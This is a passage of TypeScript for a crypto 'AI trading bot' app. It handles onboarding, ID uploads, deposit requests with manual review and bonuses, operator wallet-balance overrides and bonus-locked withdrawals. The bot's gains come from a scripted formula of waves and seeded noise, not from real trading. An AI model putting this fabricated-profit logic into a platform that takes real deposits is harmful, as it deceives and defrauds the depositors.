  const cappedTakeProfitPercent = Math.min(takeProfitPercent, MAX_BOT_GAIN_PERCENT);
  const executionBoost = BASE_BOT_TICK_INTERVAL_MS / tickIntervalMs;

  let currentBalanceUsd = snapshot.bot.currentBalanceUsd;
  let tickCount = snapshot.bot.tickCount;
  let active = snapshot.bot.active;
  let status: BotStatus = "running";
  let stoppedAt = snapshot.bot.stoppedAt;
  let processedTicks = 0;
  let equityHistory = [...snapshot.bot.equityHistory];

  // Keep the simulation deterministic so refreshes and tests converge on the same wallet state.
  for (let index = 0; index < appliedTicks; index += 1) {
    const sequence = tickCount + index + 1;
    const noise = seedToSignedUnit(`${snapshot.bot.sessionId}:${sequence}`);
    const cycleLength = riskLevel === "high" ? 16 : riskLevel === "medium" ? 20 : 26;
    const cyclePosition = ((sequence - 1) % cycleLength) / cycleLength;
    const launchBias =
      cyclePosition < 0.16 ? 0.055
      : cyclePosition < 0.36 ? 0.026
      : cyclePosition < 0.58 ? 0.008
      : cyclePosition < 0.82 ? -0.018
      : -0.04;
    const flowWave = Math.sin(sequence / (riskLevel === "high" ? 1.9 : riskLevel === "medium" ? 2.6 : 3.3)) * 0.016;
    const hypeWave = Math.cos(sequence / (riskLevel === "high" ? 3.2 : riskLevel === "medium" ? 4.1 : 5.2)) * 0.011;
    const bearishFade = cyclePosition > 0.72 ? -0.012 : 0;
    const pullbackPulse = sequence % (riskLevel === "high" ? 5 : 7) === 0 ? -0.028 : 0.01;
    const aiBias = launchBias + flowWave + hypeWave + bearishFade + pullbackPulse;
    const changePercent =
      (riskBaseReturn[riskLevel] * (cyclePosition < 0.42 ? 1 : 0.45) + strategyBonus + aiBias + noise * riskVolatility[riskLevel])
      * leverageMultipliers[leverage]
      * riskReturnMultipliers[riskLevel]
      * Math.sqrt(executionBoost);
    currentBalanceUsd = roundCurrency(Math.max(0, currentBalanceUsd * (1 + changePercent / 100)));
    processedTicks += 1;
    const tickTimestamp = new Date(lastUpdatedAt.getTime() + processedTicks * tickIntervalMs).toISOString();

    let profitLossPercent = startingBalanceUsd > 0 ? ((currentBalanceUsd - startingBalanceUsd) / startingBalanceUsd) * 100 : 0;

    if (profitLossPercent >= cappedTakeProfitPercent) {
      currentBalanceUsd = roundCurrency(startingBalanceUsd * (1 + cappedTakeProfitPercent / 100));
      profitLossPercent = cappedTakeProfitPercent;
      active = false;
      status = "take_profit_hit";
      stoppedAt = tickTimestamp;
    } else if (profitLossPercent <= -cappedStopLossPercent) {
      currentBalanceUsd = roundCurrency(startingBalanceUsd * (1 - cappedStopLossPercent / 100));
      profitLossPercent = -cappedStopLossPercent;
      active = false;
      status = "stop_loss_hit";
      stoppedAt = tickTimestamp;
    }

    equityHistory = appendBotEquityPoint(
      equityHistory,
      createBotEquityPoint(
        snapshot.bot.sessionId,
        tickTimestamp,
        currentBalanceUsd,
        startingBalanceUsd,
        active ? "running" : status,
        tickCount + processedTicks,
      ),
    );

    if (!active) {
      break;
    }
  }

  tickCount += processedTicks;

  const profitUsd = roundCurrency(currentBalanceUsd - startingBalanceUsd);
  const profitLossPercent = startingBalanceUsd > 0 ? roundCurrency(((currentBalanceUsd - startingBalanceUsd) / startingBalanceUsd) * 100) : 0;
  const lastHistoryTimestamp =
    processedTicks > 0
      ? new Date(lastUpdatedAt.getTime() + processedTicks * tickIntervalMs).toISOString()
      : snapshot.bot.lastUpdatedAt;
  const tradeHistory = updateBotTradeHistoryEntry(snapshot.bot.tradeHistory, snapshot.bot.sessionId, (entry) => ({
    ...entry,
    currentBalanceUsd,
    profitUsd,
    profitLossPercent,
    lastUpdatedAt: lastHistoryTimestamp,
    status: active ? "running" : "closed",
    closedAt: active ? entry.closedAt : stoppedAt ?? lastHistoryTimestamp,
    closeReason: active
      ? "active"
      : status === "take_profit_hit"
        ? "take_profit_hit"
        : "stop_loss_hit",
  }));

  const nextSnapshot = {
    ...snapshot,
    botWalletBalanceUsd: currentBalanceUsd,
    bot: {
      ...snapshot.bot,
      active,
      status,
      currentBalanceUsd,
      profitUsd,
      profitLossPercent,
      tickCount,
      lastUpdatedAt: lastHistoryTimestamp,
      stoppedAt,
      equityHistory,
      tradeHistory,
    },
  };

  if (!active && (status === "take_profit_hit" || status === "stop_loss_hit")) {
    return settleBotBalanceToMainWallet(nextSnapshot, {
      closeReason: status === "take_profit_hit" ? "take_profit_hit" : "stop_loss_hit",
      settledAmountUsd: currentBalanceUsd,
      settledAt: stoppedAt ?? lastHistoryTimestamp,
      status,
    });
  }

  return ensureDashboardState(nextSnapshot);
};

const creditApprovedDeposit = (
  snapshot: WorkflowSnapshot,
  wallet: Pick<DepositWallet, "tokenCode" | "tokenName" | "networkLabel" | "address">,
  amountUsd: number,
  source: string,
  txHash: string,
  creditedAt: string,
  incrementMainWalletBalance = true,
) => {
  const depositAmountUsd = sanitizeNumber(amountUsd);
  const totalCreditedAmountUsd = getDepositTotalWithBonusUsd(depositAmountUsd);

  return ensureDashboardState({
    ...snapshot,
    mainWalletBalanceUsd: incrementMainWalletBalance
      ? roundCurrency(snapshot.mainWalletBalanceUsd + totalCreditedAmountUsd)
      : snapshot.mainWalletBalanceUsd,
    simulatedDeposits: [
      {
        id: createEntityId("simulated-deposit"),
        tokenCode: wallet.tokenCode,
        tokenName: wallet.tokenName,
        networkLabel: wallet.networkLabel,
        address: wallet.address,
        amountUsd: depositAmountUsd,
        source,
        txHash,
        creditedAt,
      },
      ...snapshot.simulatedDeposits,
    ],
    transactions: [
      {
        id: `${wallet.tokenCode}-${txHash}`,
        tokenCode: wallet.tokenCode,
        networkLabel: wallet.networkLabel,
        address: wallet.address,
        amount: depositAmountUsd.toFixed(2),
        status: "confirmed",
        source,
        txHash,
        detectedAt: creditedAt,
      },
      ...snapshot.transactions,
    ],
  });
};

export const createWorkflowSnapshot = (snapshot?: Partial<WorkflowSnapshot> | null): WorkflowSnapshot => {
  const normalizedSnapshot = ensureVerificationBonus(normalizeSnapshot(snapshot));
  const withAddresses =
    normalizedSnapshot.approvalStatus === "approved" && normalizedSnapshot.depositAddresses.length === 0
      ? {
          ...normalizedSnapshot,
          depositAddresses: createDepositAddresses(normalizedSnapshot),
        }
      : normalizedSnapshot;

  return ensureDashboardState(syncTradingBotState(withAddresses));
};

const persistSnapshot = (snapshot: WorkflowSnapshot) => {
  const normalizedSnapshot = normalizeSnapshot({
    ...snapshot,
    updatedAt: nowIso(),
  });

  writeStorage(normalizedSnapshot);
  return normalizedSnapshot;
};

export const replaceWorkflowSnapshot = (snapshot: Partial<WorkflowSnapshot> | WorkflowSnapshot) =>
  persistSnapshot(createWorkflowSnapshot(snapshot));

export const rebaseWorkflowSnapshot = (
  snapshot: Partial<WorkflowSnapshot> | WorkflowSnapshot | null | undefined,
  userId: string,
) => {
  const normalizedSnapshot = createWorkflowSnapshot(snapshot);

  if (normalizedSnapshot.userId === userId) {
    return normalizedSnapshot;
  }

  return createWorkflowSnapshot({
    ...normalizedSnapshot,
    userId,
    depositAddresses: [],
  });
};

const updateSnapshot = async (updater: (snapshot: WorkflowSnapshot) => WorkflowSnapshot) => {
  const currentSnapshot = readStoredSnapshot();
  const nextSnapshot = updater(currentSnapshot);
  return nextSnapshot === currentSnapshot ? currentSnapshot : persistSnapshot(createWorkflowSnapshot(nextSnapshot));
};

export const clearWorkflowStorage = () => {
  removeStorage();
};

export const getCompletionPercentage = (snapshot: WorkflowSnapshot) =>
  Math.round((snapshot.completedStepIds.length / onboardingSteps.length) * 100);

export const getIncompleteSteps = (snapshot: WorkflowSnapshot) =>
  onboardingSteps.filter((step) => !snapshot.completedStepIds.includes(step.id));

export const getTotalWalletBalance = (snapshot: WorkflowSnapshot) =>
  roundCurrency(snapshot.mainWalletBalanceUsd + snapshot.botWalletBalanceUsd);

export const isDepositUnlocked = (snapshot: WorkflowSnapshot) => snapshot.approvalStatus === "approved";

export const isDashboardUnlocked = (snapshot: WorkflowSnapshot) =>
  snapshot.dashboardUnlocked || snapshot.simulatedDeposits.length > 0 || getTotalWalletBalance(snapshot) > 0;

export const hasConfirmedDepositCredit = (snapshot: WorkflowSnapshot) => hasConfirmedDepositCreditInternal(snapshot);

export const canMoveBotBalanceToMainWallet = (snapshot: WorkflowSnapshot) =>
  snapshot.botWalletBalanceUsd > 0;

export const getWithdrawableBalance = (snapshot: WorkflowSnapshot) =>
  hasConfirmedDepositCreditInternal(snapshot)
    ? Math.max(0, snapshot.mainWalletBalanceUsd - (snapshot.bonusLocked ? snapshot.bonusUsd : 0))
    : 0;

export const truncateAddress = (value: string, leading = 6, trailing = 6) =>
  value.length <= leading + trailing + 3 ? value : `${value.slice(0, leading)}...${value.slice(-trailing)}`;

export const formatWorkflowTimestamp = (value: string | null | undefined) =>
  value
    ? new Intl.DateTimeFormat("en-US", {
        dateStyle: "medium",
        timeStyle: "short",
      }).format(new Date(value))
    : "Not yet recorded";

export const formatUsdCurrency = (value: number | string) =>
  new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    maximumFractionDigits: 2,
  }).format(sanitizeNumber(value));

export const getWorkflowSnapshot = async () => {
  const currentSnapshot = readStoredSnapshot();
  const nextSnapshot = createWorkflowSnapshot(currentSnapshot);

  return nextSnapshot !== currentSnapshot ? persistSnapshot(nextSnapshot) : currentSnapshot;
};

export const setCurrentWorkflowStep = async (stepId: OnboardingStepId) =>
  updateSnapshot((snapshot) => (canOpenWorkflowStep(snapshot, stepId) ? { ...snapshot, currentStepId: stepId } : snapshot));

export const setDepositAddresses = async (input: DepositAddressOverrideInput) =>
  updateSnapshot((snapshot) => applyDepositAddressOverridesToSnapshot(snapshot, input));

export const saveReviewAccessRequirements = async (input: ReviewRequirementsInput) =>
  updateSnapshot((snapshot) => {
    const stepUpdate = completeStep(snapshot, "review-access-requirements");
    return {
      ...snapshot,
      ...stepUpdate,
      reviewRequirements: input,
    };
  });

export const saveIdentityChecks = async (input: IdentityChecksInput) =>
  updateSnapshot((snapshot) => {
    if (!snapshot.completedStepIds.includes("review-access-requirements")) {
      return snapshot;
    }

    const stepUpdate = completeStep(snapshot, "complete-identity-checks");
    return {
      ...snapshot,
      ...stepUpdate,
      identityChecks: input,
    };
  });

export const saveStrategyTrack = async (strategyId: StrategyId) =>
  updateSnapshot((snapshot) => {
    if (!snapshot.completedStepIds.includes("complete-identity-checks")) {
      return snapshot;
    }

    const stepUpdate = completeStep(snapshot, "choose-strategy-track");
    return {
      ...snapshot,
      ...stepUpdate,
      selectedStrategyId: strategyId,
    };
  });

export const activateAccountWorkflows = async (input: ActivationInput) =>
  updateSnapshot((snapshot) => {
    if (!snapshot.completedStepIds.includes("choose-strategy-track") || !snapshot.selectedStrategyId) {
      return snapshot;
    }

    const stepUpdate = completeStep(snapshot, "activate-account-workflows");

    return {
      ...snapshot,
      ...stepUpdate,
      activation: input,
      approvalStatus: "approved",
      approvedAt: nowIso(),
      currentStepId: "activate-account-workflows",
      depositAddresses: createDepositAddresses(snapshot),
    };
  });

export const refreshDepositTracking = async (mode: RefreshTrackingMode) =>
  updateSnapshot((snapshot) => ({
    ...snapshot,
    syncState: {
      ...snapshot.syncState,
      lastPollingCheckAt: mode === "polling" ? nowIso() : snapshot.syncState.lastPollingCheckAt,
      lastWebhookCheckAt: mode === "webhook" ? nowIso() : snapshot.syncState.lastWebhookCheckAt,
    },
  }));

export const recordIncomingDeposit = async (input: RecordIncomingDepositInput) =>
  updateSnapshot((snapshot) => {
    if (!isDepositUnlocked(snapshot)) {
      return snapshot;
    }

    const depositWallet = snapshot.depositAddresses.find((wallet) => wallet.tokenCode === input.tokenCode);
    if (!depositWallet) {
      return snapshot;
    }

    return {
      ...snapshot,
      transactions: [
        {
          id: `${input.tokenCode}-${input.txHash}`,
          tokenCode: input.tokenCode,
          networkLabel: depositWallet.networkLabel,
          address: depositWallet.address,
          amount: input.amount,
          status: input.status ?? "pending",
          source: input.source ?? "webhook",
          txHash: input.txHash,
          detectedAt: nowIso(),
        },
        ...snapshot.transactions,
      ],
    };
  });

export const submitDepositRequest = async (input: SubmitDepositRequestInput) =>
  updateSnapshot((snapshot) => {
    if (!isDepositUnlocked(snapshot)) {
      return snapshot;
    }

    const depositWallet = snapshot.depositAddresses.find((wallet) => wallet.tokenCode === input.tokenCode);
    const amountUsd = sanitizeNumber(input.amountUsd);

    if (!depositWallet || amountUsd <= 0) {
      return snapshot;
    }

    return {
      ...snapshot,
      depositRequests: [
        {
          id: createEntityId("deposit-request"),
          tokenCode: input.tokenCode,
          tokenName: depositWallet.tokenName,
          networkLabel: depositWallet.networkLabel,
          address: depositWallet.address,
          requestedAmountUsd: amountUsd,
          creditedAmountUsd: null,
          depositBonusUsd: null,
          totalCreditedAmountUsd: null,
          status: "pending_review",
          copiedAt: input.copiedAt ?? null,
          submittedByTelegramId: input.submittedByTelegramId ?? null,
          submittedAt: nowIso(),
          reviewedAt: null,
          approvalMessage: `Awaiting manual review. Approved deposits receive a ${DEPOSIT_BONUS_PERCENT}% bonus.`,
        },
        ...snapshot.depositRequests,
      ],
    };
  });

export interface SubmitIdVerificationInput {
  idType: string;
  fileName?: string | null;
  fileDataBase64?: string | null;
}

export const submitIdVerification = async (input: SubmitIdVerificationInput) =>
  updateSnapshot((snapshot) => {
    const fileName = input.fileName ?? null;
    const pendingCount = (snapshot.idVerificationRequests ?? []).filter((r) => r.status === "pending_review").length;

    if (pendingCount >= 5) {
      throw new Error("Maximum of 5 pending ID verification requests reached.");
    }

    return {
      ...snapshot,
      idVerificationRequests: [
        {
          id: createEntityId("id-verification"),
          idType: input.idType,
          fileName,
          fileDataBase64: input.fileDataBase64 ?? null,
          status: "pending_review",
          submittedAt: nowIso(),
          reviewedAt: null,
          approvalMessage: "Awaiting manual review.",
        },
        ...snapshot.idVerificationRequests,
      ],
    };
  });

export const applyManualDepositReviewToSnapshot = (
  currentSnapshot: WorkflowSnapshot,
  input: ManualDepositReviewInput,
): WorkflowSnapshot => {
  const snapshot = syncTradingBotState(currentSnapshot);
  const request = snapshot.depositRequests.find((item) => item.id === input.requestId);

  if (!request || request.status !== "pending_review") {
    return snapshot;
  }

  const reviewedAt = nowIso();
  const creditedAmountUsd = sanitizeNumber(input.creditedAmountUsd ?? request.requestedAmountUsd);
  const depositBonusUsd = calculateDepositBonusUsd(creditedAmountUsd);
  const totalCreditedAmountUsd = getDepositTotalWithBonusUsd(creditedAmountUsd);
  const approvalMessage =
    input.approvalMessage?.trim() ||
    (input.status === "approved"
      ? `Deposit confirmed manually. ${DEPOSIT_BONUS_PERCENT}% bonus added to your balance.`
      : "Deposit request rejected during manual review.");

  let nextSnapshot: WorkflowSnapshot = {
    ...snapshot,
    depositRequests: snapshot.depositRequests.map((item) =>
      item.id === request.id
        ? {
            ...item,
            status: input.status,
            creditedAmountUsd: input.status === "approved" ? creditedAmountUsd : null,
            depositBonusUsd: input.status === "approved" ? depositBonusUsd : null,
            totalCreditedAmountUsd: input.status === "approved" ? totalCreditedAmountUsd : null,
            reviewedAt,
            approvalMessage,
          }
        : item,
    ),
  };

  if (input.walletBalanceOverrides) {
    nextSnapshot = applyWalletBalanceOverrides(nextSnapshot, input.walletBalanceOverrides);
  }

  if (input.status !== "approved" || creditedAmountUsd <= 0) {
    return nextSnapshot;
  }

  const depositWallet =
    snapshot.depositAddresses.find((wallet) => wallet.tokenCode === request.tokenCode && wallet.address === request.address) ??
    snapshot.depositAddresses.find((wallet) => wallet.tokenCode === request.tokenCode) ?? {
      tokenCode: request.tokenCode,
      tokenName: request.tokenName,
      networkLabel: request.networkLabel,
      address: request.address,
    };

  const hasMainWalletOverride =
    input.walletBalanceOverrides?.mainWalletBalanceUsd !== undefined &&
    input.walletBalanceOverrides.mainWalletBalanceUsd !== null;

  return creditApprovedDeposit(
    nextSnapshot,
    depositWallet,
    creditedAmountUsd,
    "manual review",
    `manual-${request.id}`,
    reviewedAt,
    !hasMainWalletOverride,
  );
};

export const applyManualDepositReview = async (input: ManualDepositReviewInput) =>
  updateSnapshot((currentSnapshot) => applyManualDepositReviewToSnapshot(currentSnapshot, input));

export interface ManualIdReviewInput {
  requestId: string;
  status: Exclude<IdVerificationStatus, "pending_review">;
  approvalMessage?: string;
}

export const applyManualIdReviewToSnapshot = (
  currentSnapshot: WorkflowSnapshot,
  input: ManualIdReviewInput,
): WorkflowSnapshot => {
  const snapshot = syncTradingBotState(currentSnapshot);
  const request = snapshot.idVerificationRequests.find((item) => item.id === input.requestId);

  if (!request || request.status !== "pending_review") {
    return snapshot;
  }

  const reviewedAt = nowIso();
  const approvalMessage = input.approvalMessage?.trim() || (input.status === "approved" ? "ID approved." : "ID rejected.");

  const nextSnapshot: WorkflowSnapshot = {
    ...snapshot,
    idVerificationRequests: snapshot.idVerificationRequests.map((item) =>
      item.id === request.id
        ? {
            ...item,
            status: input.status,
            reviewedAt,
            approvalMessage,
          }
        : item,
    ),
  };

  return ensureDashboardState(nextSnapshot);
};

export const applyManualIdReview = async (input: ManualIdReviewInput) =>
  updateSnapshot((currentSnapshot) => applyManualIdReviewToSnapshot(currentSnapshot, input));

export const applyWalletBalanceOverridesToSnapshot = (
  currentSnapshot: WorkflowSnapshot,
  input: WalletBalanceOverrideInput,
): WorkflowSnapshot => applyWalletBalanceOverrides(syncTradingBotState(currentSnapshot), input);

export const setWalletBalances = async (input: WalletBalanceOverrideInput) =>
  updateSnapshot((currentSnapshot) => applyWalletBalanceOverridesToSnapshot(currentSnapshot, input));

export const simulateDepositCredit = async (input: SimulateDepositCreditInput) =>
  updateSnapshot((currentSnapshot) => {
    const snapshot = syncTradingBotState(currentSnapshot);
    if (!isDepositUnlocked(snapshot)) {
      return snapshot;
    }

    const depositWallet = snapshot.depositAddresses.find((wallet) => wallet.tokenCode === input.tokenCode);
    const amountUsd = sanitizeNumber(input.amountUsd);

    if (!depositWallet || amountUsd <= 0) {
      return snapshot;
    }

    const creditedAt = nowIso();
    const txHash = `sim-${input.tokenCode.toLowerCase()}-${seededString(
      `${snapshot.userId}:${creditedAt}`,
      12,
      "abcdef0123456789",
    )}`;

    return creditApprovedDeposit(snapshot, depositWallet, amountUsd, "polling", txHash, creditedAt);
  });

export const startTradingBot = async (input: StartTradingBotInput) =>
  updateSnapshot((currentSnapshot) => {
    const snapshot = syncTradingBotState(currentSnapshot);
    const allocationAmountUsd = sanitizeNumber(input.allocationAmountUsd);
    const stopLossPercent = Math.min(MAX_BOT_LOSS_PERCENT, roundCurrency(input.stopLossPercent));
    const takeProfitPercent = Math.min(MAX_BOT_GAIN_PERCENT, roundCurrency(input.takeProfitPercent));

    if (
      !isDashboardUnlocked(snapshot) ||
      allocationAmountUsd <= 0 ||
      allocationAmountUsd > snapshot.mainWalletBalanceUsd ||
      snapshot.bot.active
    ) {
      return snapshot;
    }

    const currentBotBalance = snapshot.botWalletBalanceUsd;
    const nextBotBalance = roundCurrency(currentBotBalance + allocationAmountUsd);
    const strategyLabel = input.strategyLabel.trim() || getStrategyLabel(snapshot.selectedStrategyId);
    const startedAt = nowIso();
    const sessionId = createEntityId("bot");
    const tradeLabel = getActiveTradeLabel(snapshot, input.riskLevel);
    const nextTradeHistory = [
      createBotTradeHistoryEntry(
        sessionId,
        {
          ...input,
          strategyLabel,
          allocationAmountUsd,
        },
        tradeLabel,
        startedAt,
        nextBotBalance,
      ),
      ...snapshot.bot.tradeHistory,
    ].slice(0, MAX_BOT_TRADE_HISTORY_ITEMS);

    return ensureDashboardState({
      ...snapshot,
      mainWalletBalanceUsd: roundCurrency(snapshot.mainWalletBalanceUsd - allocationAmountUsd),
      botWalletBalanceUsd: nextBotBalance,
      bot: {
        status: "running",
        active: true,
        allocatedAmountUsd: roundCurrency(snapshot.bot.allocatedAmountUsd + allocationAmountUsd),
        startingBalanceUsd: nextBotBalance,
        currentBalanceUsd: nextBotBalance,
        profitUsd: 0,
        profitLossPercent: 0,
        tradingSettings: {
          leverage: input.leverage,
          stopLossPercent,
          takeProfitPercent,
          riskLevel: input.riskLevel,
          strategyLabel,
          allocationAmountUsd,
        },
        activeTradeLabel: tradeLabel,
        startedAt,
        stoppedAt: null,
        lastUpdatedAt: startedAt,
        sessionId,
        tickCount: 0,
        equityHistory: [createBotEquityPoint(sessionId, startedAt, nextBotBalance, nextBotBalance, "running", 0)],
        tradeHistory: nextTradeHistory,
      },
    });
  });

export const syncTradingBotSimulation = async () => updateSnapshot((snapshot) => syncTradingBotState(snapshot));

export const stopTradingBot = async () =>
  updateSnapshot((currentSnapshot) => {
    const snapshot = syncTradingBotState(currentSnapshot);

    if (!snapshot.bot.active) {
      return snapshot;
    }

    const stoppedAt = nowIso();

    return ensureDashboardState({
      ...snapshot,
      bot: {
        ...snapshot.bot,
        active: false,
        status: "stopped",
        stoppedAt,
        lastUpdatedAt: stoppedAt,
        equityHistory: snapshot.bot.sessionId
          ? appendBotEquityPoint(
              snapshot.bot.equityHistory,
              createBotEquityPoint(
                snapshot.bot.sessionId,
                stoppedAt,
                snapshot.bot.currentBalanceUsd,
                snapshot.bot.startingBalanceUsd || snapshot.bot.currentBalanceUsd,
                "stopped",
                snapshot.bot.tickCount,
              ),
            )
          : snapshot.bot.equityHistory,
        tradeHistory: updateBotTradeHistoryEntry(snapshot.bot.tradeHistory, snapshot.bot.sessionId, (entry) => ({
          ...entry,
          currentBalanceUsd: snapshot.bot.currentBalanceUsd,
          profitUsd: snapshot.bot.profitUsd,
          profitLossPercent: snapshot.bot.profitLossPercent,
          lastUpdatedAt: stoppedAt,
          closedAt: stoppedAt,
          status: "closed",
          closeReason: "manual_stop",
        })),
      },
    });
  });

export const withdrawBotBalanceToMainWallet = async () =>
  updateSnapshot((currentSnapshot) => {
    const snapshot = syncTradingBotState(currentSnapshot);

    if (snapshot.bot.active || snapshot.botWalletBalanceUsd <= 0) {
      return snapshot;
    }

    return settleBotBalanceToMainWallet(
      {
        ...snapshot,
        bot: {
          ...snapshot.bot,
          status: "idle",
        },
      },
      {
        closeReason: "withdrawn_to_main_wallet",
        settledAmountUsd: snapshot.botWalletBalanceUsd,
        settledAt: nowIso(),
        status: "idle",
      },
    );
  });
